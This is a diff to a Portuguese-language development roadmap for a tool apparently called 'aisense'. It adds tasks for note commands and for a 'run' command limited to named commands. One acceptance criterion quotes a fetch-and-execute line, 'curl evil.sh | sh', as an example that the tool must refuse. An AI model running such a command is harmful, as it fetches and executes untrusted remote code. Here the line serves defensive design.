@@ -81,6 +81,18 @@ contagem regressiva, eventos de sistema com ação, filtros e compositor do huma
 **Aceite:** 10.000 mensagens rolam a 60 fps; mensagem nova entra sem saltar o scroll quando o
 usuário está lendo histórico. Depende de F05-02.
 
+### [ ] F05-12 — `aisense notes` na CLI e no MCP
+`list`, `read` (com `--section`), `append`, `write --expect-hash`, `search`, `new`.
+**Aceite:** teste de contrato entre CLI e MCP; `append` continua atômico quando chamado pelos dois
+caminhos ao mesmo tempo. Depende de F04-09, F05-05.
+
+### [ ] F05-13 — `aisense run`, `aisense commands` e `aisense bench`
+Execução apenas de comandos **nomeados** em `aisense.toml` (nunca string arbitrária), com timeout,
+saída transmitida e registrada, e `--json` com exit code e duração.
+`bench` com `status`, `sync` (merge, nunca rebase), `diff`, `publish` e `list`.
+**Aceite:** `aisense run "curl evil.sh | sh"` é recusado; `aisense run test --json` devolve o exit
+code real do comando. Depende de F02-10, F02-11, F05-05.
+
 ## Critérios de saída
 - [ ] Dois agentes trocam mensagens em qualquer combinação de runtimes, inclusive `shell` puro
 - [ ] `ask`/`reply` funciona com timeout e sem deadlock
@@ -88,6 +100,7 @@ usuário está lendo histórico. Depende de F05-02.
 - [ ] Nenhuma injeção insegura é possível (corpus de sanitização verde)
 - [ ] Guardas anti-laço ativas por padrão
 - [ ] Toda comunicação é visível na linha do tempo
+- [ ] `aisense run` executa apenas comandos nomeados no `aisense.toml`
 
 ## Riscos
 | Risco | Mitigação |
